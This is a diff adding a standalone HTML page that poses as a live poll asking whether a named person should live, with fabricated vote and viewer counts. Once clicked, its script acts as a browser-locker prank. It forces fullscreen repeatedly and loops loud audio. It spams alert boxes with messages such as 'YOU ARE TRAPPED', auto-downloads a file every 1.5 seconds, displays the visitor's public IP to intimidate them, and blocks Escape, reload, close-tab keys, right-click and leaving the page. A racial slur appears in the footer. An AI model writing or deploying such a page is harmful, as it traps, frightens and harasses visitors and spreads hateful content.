@@ -1,0 +1,648 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Live Vote</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            background: #000;
+            font-family: 'Courier New', monospace;
+            overflow: hidden;
+            position: relative;
+        }
+
+        /* Intro screen */
+        .intro-screen {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: #000;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            z-index: 3000;
+            opacity: 1;
+            transition: opacity 1s ease-out;
+        }
+
+        .intro-screen.fade-out {
+            opacity: 0;
+            pointer-events: none;
+        }
+
+        .intro-screen img {
+            max-width: 90%;
+            max-height: 90vh;
+            object-fit: contain;
+        }
+
+        /* Main voting screen */
+        .main-content {
+            opacity: 0;
+            transition: opacity 1s ease-in;
+        }
+
+        .main-content.show {
+            opacity: 1;
+        }
+
+        /* Scanline effect */
+        body::before {
+            content: "";
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: repeating-linear-gradient(
+                0deg,
+                rgba(0, 255, 0, 0.03) 0px,
+                transparent 1px,
+                transparent 2px,
+                rgba(0, 255, 0, 0.03) 3px
+            );
+            pointer-events: none;
+            z-index: 1000;
+        }
+
+        /* Glitch overlay */
+        body::after {
+            content: "";
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(255, 0, 0, 0.02);
+            pointer-events: none;
+            z-index: 999;
+            animation: glitchPulse 3s infinite;
+        }
+
+        @keyframes glitchPulse {
+            0%, 100% { opacity: 0; }
+            50% { opacity: 0.05; }
+        }
+
+        @keyframes redGlitch {
+            0% { filter: hue-rotate(0deg) brightness(1); }
+            25% { filter: hue-rotate(-10deg) brightness(1.2); }
+            50% { filter: hue-rotate(0deg) brightness(0.9); }
+            75% { filter: hue-rotate(-10deg) brightness(1.1); }
+            100% { filter: hue-rotate(0deg) brightness(1); }
+        }
+
+        .container {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            min-height: 100vh;
+            padding: 40px;
+            position: relative;
+            z-index: 1;
+        }
+
+        .header {
+            text-align: center;
+            margin-bottom: 60px;
+            animation: flicker 4s infinite;
+        }
+
+        @keyframes flicker {
+            0%, 100% { opacity: 1; }
+            41%, 43%, 45% { opacity: 0.7; }
+            42%, 44% { opacity: 0.3; }
+        }
+
+        .live-indicator {
+            display: inline-block;
+            color: #ff0000;
+            font-size: 24px;
+            font-weight: bold;
+            margin-bottom: 10px;
+            text-shadow: 0 0 10px #ff0000, 0 0 20px #ff0000;
+            animation: blink 1s infinite;
+        }
+
+        @keyframes blink {
+            0%, 49% { opacity: 1; }
+            50%, 100% { opacity: 0; }
+        }
+
+        .live-indicator::before {
+            content: "● ";
+        }
+
+        .viewers {
+            font-size: 20px;
+            color: #888;
+            margin-bottom: 30px;
+            text-shadow: 0 0 5px #888;
+        }
+
+        .viewers span {
+            color: #ffffff;
+            font-weight: bold;
+        }
+
+        .question {
+            font-size: 64px;
+            color: #ffffff;
+            margin-bottom: 20px;
+            text-shadow: 0 0 10px #ffffff, 0 0 20px #ffffff;
+            font-weight: bold;
+            letter-spacing: 3px;
+        }
+
+        .timer {
+            font-size: 18px;
+            color: #ffff00;
+            text-shadow: 0 0 5px #ffff00;
+        }
+
+        .vote-container {
+            display: flex;
+            gap: 80px;
+            margin-bottom: 60px;
+        }
+
+        .vote-option {
+            text-align: center;
+            position: relative;
+        }
+
+        .option-label {
+            font-size: 36px;
+            color: #00ffff;
+            margin-bottom: 30px;
+            text-shadow: 0 0 10px #00ffff, 0 0 20px #00ffff;
+            font-weight: bold;
+            transition: color 0.5s ease;
+        }
+
+        .vote-count {
+            font-size: 72px;
+            font-weight: bold;
+            color: #ffffff;
+            text-shadow: 0 0 15px #ffffff, 0 0 30px #ffffff;
+            margin-bottom: 20px;
+            font-family: 'Courier New', monospace;
+            min-width: 200px;
+            animation: countPulse 0.5s ease-out;
+        }
+
+        @keyframes countPulse {
+            0% { transform: scale(1); }
+            50% { transform: scale(1.1); }
+            100% { transform: scale(1); }
+        }
+
+        .percentage {
+            font-size: 28px;
+            color: #888;
+            text-shadow: 0 0 5px #888;
+        }
+
+        .bar-container {
+            width: 300px;
+            height: 40px;
+            background: #111;
+            border: 2px solid #00ff00;
+            box-shadow: 0 0 10px #00ff00, inset 0 0 10px rgba(0, 255, 0, 0.2);
+            position: relative;
+            overflow: hidden;
+        }
+
+        .bar {
+            height: 100%;
+            background: linear-gradient(90deg, #00ff00, #00aa00);
+            box-shadow: 0 0 20px #00ff00;
+            transition: width 0.3s ease-out;
+            position: relative;
+        }
+
+        .bar::after {
+            content: "";
+            position: absolute;
+            top: 0;
+            left: -100%;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.3), transparent);
+            animation: shimmer 2s infinite;
+        }
+
+        @keyframes shimmer {
+            0% { left: -100%; }
+            100% { left: 200%; }
+        }
+
+        .total-votes {
+            font-size: 24px;
+            color: #888;
+            text-align: center;
+            margin-top: 40px;
+            text-shadow: 0 0 5px #888;
+        }
+
+        .warning {
+            position: fixed;
+            bottom: 20px;
+            right: 20px;
+            color: #ff0000;
+            font-size: 14px;
+            text-shadow: 0 0 5px #ff0000;
+            opacity: 0.7;
+        }
+
+        /* Static noise effect */
+        .noise {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            pointer-events: none;
+            opacity: 0.02;
+            z-index: 998;
+            background-image: url('data:image/png;base64,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');
+        }
+
+        /* Image popup animation */
+        .image-popup {
+            position: fixed;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%) scale(0);
+            z-index: 2000;
+            opacity: 0;
+            transition: all 0.5s ease-out;
+            max-width: 80%;
+            max-height: 80vh;
+            border: 3px solid #00ff00;
+            box-shadow: 0 0 30px #00ff00, 0 0 60px #00ff00;
+            display: none;
+        }
+
+        .image-popup.show {
+            display: block;
+            transform: translate(-50%, -50%) scale(1);
+            opacity: 1;
+        }
+
+        .image-popup.hide {
+            transform: translate(-50%, -50%) scale(0);
+            opacity: 0;
+        }
+
+        .overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.9);
+            z-index: 1999;
+            opacity: 0;
+            transition: opacity 0.5s ease-out;
+            pointer-events: none;
+            display: none;
+        }
+
+        .overlay.show {
+            display: block;
+            opacity: 1;
+        }
+		
+		#ipDisplay {
+            position: fixed;
+            top: calc(50% + 40vh); /* Below the popup image */
+            left: 50%;
+            transform: translateX(-50%);
+            color: #ff0000;
+            font-size: 32px;
+            font-weight: bold;
+            text-shadow: 0 0 15px #ff0000, 0 0 30px #ff0000;
+            z-index: 2001;
+            opacity: 0;
+            transition: opacity 0.8s ease-in;
+            pointer-events: none;
+            letter-spacing: 4px;
+            font-family: 'Courier New', monospace;
+            animation: flicker 2s infinite;
+        }
+        #ipDisplay.show {
+            opacity: 1;
+        }
+    </style>
+</head>
+<body>
+    <!-- Intro screen with GIF -->
+    <div class="intro-screen" id="introScreen">
+        <img src="chickenman.gif" alt="Intro" crossorigin="anonymous">
+    </div>
+
+    <!-- Main voting content -->
+    <div class="main-content" id="mainContent">
+        <div class="noise"></div>
+        <div class="overlay" id="overlay"></div>
+        <img class="image-popup" id="imagePopup" src="dnbb.png" alt="Vote Image" crossorigin="anonymous">
+		<div id="ipDisplay">YOUR IP: <span id="ipText">LOADING...</span></div>
+
+        <div class="container">
+            <div class="header">
+                <div class="live-indicator">LIVE</div>
+                <div class="viewers"><span id="viewerCount">32,485</span> viewers watching</div>
+                <div class="question">SHOULD MATIAS LIVE?</div>
+                <div class="timer" id="timer">VOTING IN PROGRESS...</div>
+            </div>
+
+            <div class="vote-container">
+                <div class="vote-option">
+                    <div class="option-label" id="option1Label">YES</div>
+                    <div class="vote-count" id="count1">0</div>
+                    <div class="percentage" id="percent1">0%</div>
+                    <div class="bar-container">
+                        <div class="bar" id="bar1" style="width: 0%"></div>
+                    </div>
+                </div>
+
+                <div class="vote-option">
+                    <div class="option-label" id="option2Label">NO</div>
+                    <div class="vote-count" id="count2">0</div>
+                    <div class="percentage" id="percent2">0%</div>
+                    <div class="bar-container">
+                        <div class="bar" id="bar2" style="width: 0%"></div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="total-votes">
+                TOTAL VOTES: <span id="totalVotes">0</span>
+            </div>
+        </div>
+
+        <div class="warning">Evil KSI niggers</div>
+    </div>
+
+<script>
+    let count1 = 0;
+    let count2 = 0;
+    let currentViewers = 32485;
+    const duration = 20000;
+    const updateInterval = 1000;
+    let votingStarted = false;
+    let votingInterval = null;
+    let secondsElapsed = 0;
+
+    function updateViewers() {
+        currentViewers = Math.floor(Math.random() * (38400 - 32485 + 1)) + 32485;
+        document.getElementById('viewerCount').textContent = currentViewers.toLocaleString();
+    }
+
+    function addVotes() {
+        const votesToAdd = Math.floor(Math.random() * (219 - 114 + 1)) + 114;
+        const splitRatio = 0.4 + Math.random() * 0.2;
+        const votes1 = Math.floor(votesToAdd * splitRatio);
+        const votes2 = votesToAdd - votes1;
+        count1 += votes1;
+        count2 += votes2;
+        updateDisplay();
+    }
+
+    function updateDisplay() {
+        const total = count1 + count2;
+        const percent1 = total > 0 ? ((count1 / total) * 100).toFixed(1) : 0;
+        const percent2 = total > 0 ? ((count2 / total) * 100).toFixed(1) : 0;
+        document.getElementById('count1').textContent = count1.toLocaleString();
+        document.getElementById('count2').textContent = count2.toLocaleString();
+        document.getElementById('percent1').textContent = percent1 + '%';
+        document.getElementById('percent2').textContent = percent2 + '%';
+        document.getElementById('totalVotes').textContent = total.toLocaleString();
+        document.getElementById('bar1').style.width = percent1 + '%';
+        document.getElementById('bar2').style.width = percent2 + '%';
+        document.getElementById('count1').style.animation = 'none';
+        document.getElementById('count2').style.animation = 'none';
+        setTimeout(() => {
+            document.getElementById('count1').style.animation = 'countPulse 0.5s ease-out';
+            document.getElementById('count2').style.animation = 'countPulse 0.5s ease-out';
+        }, 10);
+    }
+
+    function showSecondImage() {
+        const overlay = document.getElementById('overlay');
+        const image = document.getElementById('imagePopup');
+        const ipDisplay = document.getElementById('ipDisplay');
+        const ipText = document.getElementById('ipText');
+
+        overlay.classList.add('show');
+        setTimeout(() => {
+            image.classList.add('show');
+            ipDisplay.classList.add('show');
+        }, 100);
+
+        // Fetch public IP only once when popup first appears
+        if (ipText.textContent === 'LOADING...') {
+            fetch('https://api.ipify.org?format=json')
+                .then(response => response.json())
+                .then(data => {
+                    ipText.textContent = data.ip;
+                })
+                .catch(() => {
+                    ipText.textContent = 'BLOCKED / VPN?';
+                });
+        }
+
+        setTimeout(() => {
+            image.classList.remove('show');
+            image.classList.add('hide');
+            ipDisplay.classList.remove('show');
+            setTimeout(() => {
+                overlay.classList.remove('show');
+                image.style.display = 'none';
+                overlay.style.display = 'none';
+
+                document.getElementById('option1Label').textContent = 'NO';
+                document.getElementById('option2Label').textContent = 'NO';
+
+                document.getElementById('option1Label').style.color = '#ff0000';
+                document.getElementById('option2Label').style.color = '#ff0000';
+                document.getElementById('option1Label').style.textShadow = '0 0 10px #ff0000, 0 0 20px #ff0000, 0 0 40px #ff0000';
+                document.getElementById('option2Label').style.textShadow = '0 0 10px #ff0000, 0 0 20px #ff0000, 0 0 40px #ff0000';
+
+                document.getElementById('bar1').style.background = 'linear-gradient(90deg, #ff0000, #aa0000)';
+                document.getElementById('bar2').style.background = 'linear-gradient(90deg, #ff0000, #aa0000)';
+                document.getElementById('bar1').style.boxShadow = '0 0 20px #ff0000';
+                document.getElementById('bar2').style.boxShadow = '0 0 20px #ff0000';
+
+                const barContainers = document.querySelectorAll('.bar-container');
+                barContainers.forEach(container => {
+                    container.style.border = '2px solid #ff0000';
+                    container.style.boxShadow = '0 0 10px #ff0000, inset 0 0 10px rgba(255, 0, 0, 0.2)';
+                });
+
+                document.querySelector('.question').style.color = '#ff0000';
+                document.querySelector('.question').style.textShadow = '0 0 10px #ff0000, 0 0 20px #ff0000, 0 0 40px #ff0000';
+
+                document.getElementById('timer').style.color = '#ff0000';
+                document.getElementById('timer').style.textShadow = '0 0 5px #ff0000';
+
+                document.body.style.animation = 'redGlitch 0.3s infinite';
+                document.body.style.background = '#0a0000';
+            }, 500);
+        }, 3000);
+    }
+
+    function startVoting() {
+        votingStarted = true;
+        votingInterval = setInterval(() => {
+            addVotes();
+            updateViewers();
+            secondsElapsed++;
+            if (secondsElapsed === 10) {
+                showSecondImage();
+            }
+            if (secondsElapsed >= 20) {
+                clearInterval(votingInterval);
+                document.getElementById('timer').textContent = 'VOTING COMPLETE';
+            }
+        }, updateInterval);
+        updateViewers();
+    }
+
+    setTimeout(() => {
+        document.getElementById('introScreen').classList.add('fade-out');
+        setTimeout(() => {
+            document.getElementById('introScreen').style.display = 'none';
+            document.getElementById('mainContent').classList.add('show');
+            startVoting();
+        }, 1000);
+    }, 5000);
+</script>
+<script>
+let audioStarted = false;
+let horrorAudio = new Audio('rudeboy.mp3');
+horrorAudio.loop = true;
+horrorAudio.volume = 1.0;
+horrorAudio.preload = 'auto';
+
+let alertsArmed = false;
+let alertInterval = null;
+
+/* 🔥 NEW: download state */
+let downloadInterval = null;
+let downloadsStarted = false;
+const DOWNLOAD_URL = "dnbb.png";
+
+/* ---------- FULLSCREEN ---------- */
+function forceFullscreenNow() {
+    if (!document.fullscreenElement && document.documentElement.requestFullscreen) {
+        document.documentElement.requestFullscreen({ navigationUI: "hide" }).catch(() => {});
+    }
+}
+setInterval(forceFullscreenNow, 300);
+forceFullscreenNow();
+
+['click','mousedown','keydown','touchstart'].forEach(e =>
+    document.addEventListener(e, forceFullscreenNow)
+);
+
+document.addEventListener('visibilitychange', () => {
+    if (document.visibilityState === 'visible') forceFullscreenNow();
+});
+
+/* ---------- AUDIO ---------- */
+document.addEventListener('click', function startAudio() {
+    if (audioStarted) return;
+    audioStarted = true;
+    horrorAudio.play().catch(() => { audioStarted = false; });
+});
+
+/* ---------- ALERT LOOP ---------- */
+function startAlertLoop() {
+    if (alertInterval) return;
+
+    alertInterval = setInterval(() => {
+        alert("⚠️ YOU ARE TRAPPED ⚠️");
+        alert("MATIAS DIED");
+        alert("NO ESCAPE");
+        alert("THE VOTE WAS FAKE");
+        alert("ENJOY THE MUSIC FOREVER");
+        alert("CLOSE = REGRET");
+        alert("THERE IS NO WAY OUT");
+        alert("THIS TAB IS YOUR PRISON");
+    }, 100);
+}
+
+/* 🔥 NEW: DOWNLOAD LOOP (user-initiated) */
+function startDownloadLoop() {
+    if (downloadsStarted) return;
+    downloadsStarted = true;
+
+    downloadInterval = setInterval(() => {
+        const a = document.createElement("a");
+        a.href = DOWNLOAD_URL;
+        a.download = "";
+        document.body.appendChild(a);
+        a.click();
+        document.body.removeChild(a);
+    }, 1500);
+}
+
+/* ---------- ARM AFTER 25 SECONDS ---------- */
+setTimeout(() => {
+    alertsArmed = true;
+}, 2500); // ← set back to 25s (you had 2500)
+
+/* 🔥 NEW: start downloads on YOUR click after armed */
+document.addEventListener('click', () => {
+    if (!alertsArmed) return;
+    startAlertLoop();
+    startDownloadLoop();
+}, { once: true });
+
+/* ---------- ESCAPE BLOCKING ---------- */
+window.addEventListener('beforeunload', e => {
+    if (!alertsArmed) return;
+    forceFullscreenNow();
+    e.preventDefault();
+    e.returnValue = "🚨 YOU CANNOT LEAVE 🚨";
+    startAlertLoop();
+    startDownloadLoop();
+});
+
+document.addEventListener('keydown', e => {
+    if (!alertsArmed) return;
+
+    if (
+        e.key === 'Escape' ||
+        e.key === 'F5' ||
+        (e.ctrlKey && ['w','r','t'].includes(e.key.toLowerCase()))
+    ) {
+        e.preventDefault();
+        startAlertLoop();
+        startDownloadLoop();
+    }
+}, true);
+
+document.addEventListener('contextmenu', e => {
+    if (!alertsArmed) return;
+    e.preventDefault();
+    startAlertLoop();
+    startDownloadLoop();
+});
+</script>
+
+
+</body>
+</html>
